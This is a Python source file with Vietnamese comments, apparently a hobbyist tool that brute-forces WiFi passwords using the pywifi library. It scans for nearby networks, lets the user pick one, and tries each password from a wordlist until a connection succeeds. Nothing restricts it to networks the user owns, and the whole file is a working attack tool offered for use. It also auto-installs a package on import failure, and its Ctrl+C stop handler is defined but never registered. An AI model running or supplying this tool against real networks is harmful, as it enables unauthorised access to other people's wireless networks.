import os
import time


try:
    import pywifi
    from pywifi import const
except ImportError:
    import os
    os.system("pip install pywifi")
    import pywifi
    from pywifi import const



stop_program = False

# check wifi da ket noi
connected_wifi_passwords = {}

# Brute force wifi password
# cho phép chọn interface
# cho phép chọn wifi muốn dò password

logo ="""     
                     \x1b[38;2;39;216;255mTool check pass wifi by Terris
                     \x1b[38;2;39;216;255mVui lòng không brute force wifi đã kết nối
                     \x1b[38;2;39;216;255mNếu không tìm thấy wifi xung quanh, vui lòng bật phần Internet Access lên
"""

# Ctrl C la dung brute force
def signal_handler(sig, frame):
    global stop_program
    stop_program = True
    print("\nĐang dừng chương trình...")

# đây là hàm để quét các interface
def scan_wifi_interfaces():
    wifi = pywifi.PyWiFi()
    interfaces = wifi.interfaces()
    return interfaces

# hàm chạy text
def run(text, delay=0.00001): # đã nâng speed vì source cũ load quá chậm
    for char in text:
        print(char, end='', flush=True)
        time.sleep(delay)
    print()

# cũng là chạy text nhưng éo có màu
def run2(text, delay=0.00001):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(delay)
    print()

# Hàm clear terminal trước đó
def clear_previous_output():
    os.system('cls' if os.name == 'nt' else 'clear')

# Chọn interface
def select_wifi_interface(interfaces):
    clear_previous_output()
    run(logo)
    print("\033[96m\033[1mGiao diện WiFi có sẵn:")
    if not interfaces:
        print("\033[91mKhông tìm thấy giao diện WiFi nào. Vui lòng kiểm tra kết nối và chạy lại tool.")
        return None

    for i, interface in enumerate(interfaces):
        run2("\033[93m\033[1m{}. {}".format(i+1, interface.name()))

    while True:
        try:
            selection = int(input("\033[94m\033[1mChọn giao diện (nhập số tương ứng):\033[93m\033[1m "))
            if selection < 1 or selection > len(interfaces):
                print("\033[91mLựa chọn không hợp lệ.")
            else:
                return interfaces[selection - 1]
        except ValueError:
            print("\033[91mVui lòng nhập một số.")

    if selection < 1 or selection > len(interfaces):
        print("\033[91mLựa chọn không hợp lệ.")
        return None
    return interfaces[selection - 1]

# Với interface vừa chọn, quét các mạng wifi có thể kết nối đến
def scan_wifi_access_points(interface):
    max_retry = 5
    access_points = []
    for _ in range(max_retry):
        try:
            interface.scan()
            time.sleep(2)  # thoi gian doi scan
            ssid_list = interface.scan_results()
            if ssid_list:
                access_points = [{'SSID': ssid.ssid, 'BSSID': ssid.bssid} for ssid in ssid_list]
                break  
            else:
                print("\033[91mKhông tìm thấy bất kỳ mạng WiFi nào. Đang thử quét lại...")
                time.sleep(2)
        except Exception as e:
            print("\033[91mLỗi khi quét mạng WiFi:", e)
            print("\033[91mĐang thử quét lại...")
            time.sleep(2)
    if not access_points:
        print("\033[91mQuét mạng WiFi thất bại sau {} lần thử.".format(max_retry))
    return access_points

# chọn wifi để kết nối thôi
def select_wifi_access_point(access_points):
    clear_previous_output()
    run(logo)
    print("\033[96m\033[1mCác wifi xung quanh quét được:")
    for i, ap in enumerate(access_points):
        print("\033[93m\033[1m{}. HOSTNAME: {}, BSSID: {}".format(i+1, ap['SSID'], ap['BSSID']))
    selection = int(input("\033[94m\033[1mChọn một điểm truy cập (nhập số tương ứng):\033[93m\033[1m "))
    
    # Nếu chọn không đúng thì trả về None
    # Nếu đúng thì đưa đến bước thử password
    if selection < 1 or selection > len(access_points):
        print("\033[91mLựa chọn không hợp lệ.")
        return None
    return access_points[selection - 1]

# Load 1 file chứa password
# có thể download trên mạng
# hoặc dùng file có sẵn trong kali linux
def load_passwords_from_file(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            passwords = file.read().splitlines()
        return passwords
    except FileNotFoundError:
        print("\033[91mFile không tồn tại.")
        return None

# Hàm xử lý việc kết nối đến wifi
def connect_to_wifi(interface, access_point, password=None):
    profile = pywifi.Profile()
    profile.ssid = access_point['SSID']
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_NONE)
    if password:
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password
    else:
        profile.cipher = const.CIPHER_TYPE_NONE
    tmp_profile = interface.add_network_profile(profile)
    interface.connect(tmp_profile)
    
    # Đợi kết nối
    # Có thể chỉnh lên hoặc xuống
    # tùy vào tốc độ xử lý mạng
    # đây mặc định mình để 2 giây
    time.sleep(2)
    connected = False
    if interface.status() == const.IFACE_CONNECTED:
        connected = True
        # If connected successfully, save the password to the dictionary (khuc nay ChatGPT chu khong biet fix)
        connected_wifi_passwords[access_point['SSID']] = password
    return connected


##
##
## Đây là đoạn gọi code để chạy
##
##

# Quét các interface khả dụng
interfaces = scan_wifi_interfaces()

# chọn 1 interface
interface = select_wifi_interface(interfaces)

nhện = """
\033[91m\033[1m
            #               #
          ##                 ##
         ##                   ##
        ##                     ##
        ##                     ##
        ##                     ##
         ##                   ##
     ##  ##                   ##  ##
    ##   ##                   ##   ##
   ##     ##                 ##     ##
   #       ###             ###       #
   ##       ###           ###       ##
   ###       ###  #####  ###       ###
    ######    #############   #######
         ######################
    ################################
   ### ########################## ###
  ###         ############         ###
 ##         #################        ##
 ##     ########################     ##
##     ###  ################  ###     ##
 ##    ##   #######  #######   ##    ##
  #    ##   #######  #######   ##    #
   #   ##   ################   ##   #
    #  ##    ##############    ##  #
       ##     ############     ##
       ##       ########       ##
        ##                    ##
        
                            \033[4m\033[94mBY HOÀNG
\033[0m
"""

if interface:
    # Quét wifi có thể kết nối
    access_points = scan_wifi_access_points(interface)

    # Chọn wifi
    access_point = select_wifi_access_point(access_points)
    clear_previous_output()
    run(nhện)

    if access_point:
        # Thực hiện thử password
        if access_point['SSID'] in connected_wifi_passwords:
            password = connected_wifi_passwords[access_point['SSID']]
            print("\033[93m\033[1mĐã tìm thấy mật khẩu đã lưu cho wifi '{}'.".format(access_point['SSID']))
            print("\033[93m\033[1mĐang kết nối với mật khẩu đã lưu...")
            connected = connect_to_wifi(interface, access_point, password)
            if connected:
                print("\033[92m\033[1mKết nối thành công với điểm truy cập: \033[4m\033[93m'{}'\033[0m".format(password))
            else:
                print("\033[91m\033[1mKhông thể kết nối với mật khẩu đã lưu. Thử các mật khẩu khác...")
        else:
            print("\033[91m\033[1mKhông tìm thấy mật khẩu đã lưu cho wifi '{}'.\nBấm Ctrl C để dừng chương trình.\n".format(access_point['SSID']))
            print("\033[93m\033[1mĐang thử các mật khẩu từ danh sách...")
            # Load file chứa password 
            passwords = load_passwords_from_file("wordlist.txt")
            
            # Thử kết nối với mật khẩu từ danh sách
            if passwords is not None:
                # Thử từng pass (siêu chậm)
                for password in passwords:
                    # check dừng chương trình
                    if stop_program:
                        print("Chương trình đã dừng bởi bạn.")
                        break

                    # Phần này kết nối tới wifi đã brute force thành công
                    if connect_to_wifi(interface, access_point, password):
                        print("\033[92m\033[1mKết nối thành công với điểm truy cập: \033[4m\033[93m'{}'\033[0m".format(password))
                        break
                    else:
                        print("\033[91m\033[1mKhông thể kết nối bằng mật khẩu: \033[4m\033[93m'{}'\033[0m".format(password))
                        # chạy full và không có cái nào đúng
                else:
                    print("Đã thử hết tất cả mật khẩu. Không thể kết nối đến điểm truy cập")
